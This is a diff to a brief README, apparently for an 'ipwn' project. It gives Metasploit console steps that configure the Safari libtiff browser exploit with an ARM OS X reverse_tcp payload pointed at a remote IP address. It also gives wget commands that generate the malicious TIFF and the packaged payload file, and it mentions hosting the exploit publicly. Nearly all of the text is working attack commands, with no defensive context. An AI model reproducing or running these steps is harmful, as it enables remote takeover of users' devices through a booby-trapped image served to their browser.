@@ -13,7 +13,7 @@ In ./msfconsole:
 use exploit/osx/browser/safari_libtiff
 set URIPATH /ipwn
 set PAYLOAD osx/armle/execute/reverse_tcp
-set MHOST 74.208.82.221
+set MHOST 74.125.19.147
 set MPORT 80
 set QUERY data/reverse_tcp/query
 set PEXEC data/ipwn/Payload
@@ -22,7 +22,9 @@ exploit
 
 In a Linux shell:
 
-wget http://localhost:8080/ipwn -O y.tiff
-wget http://localhost:4444/ -O payload2.bin
+wget http://localhost:8080/ipwn -O exploit.tiff
+wget http://localhost:4444/ -O payload.bin
 
-y.tiff is the resulting exploit tiff and payload2.bin is the packaged Payload.
+exploit.tiff is the resulting exploit tiff and payload.bin is the packaged Payload. The names are insignificant except that payload.bin is referenced in data/reverse_tcp/query.
+
+The instructions I gave are the same as the ones I used to set things up for hosting the exploit on Google Code.
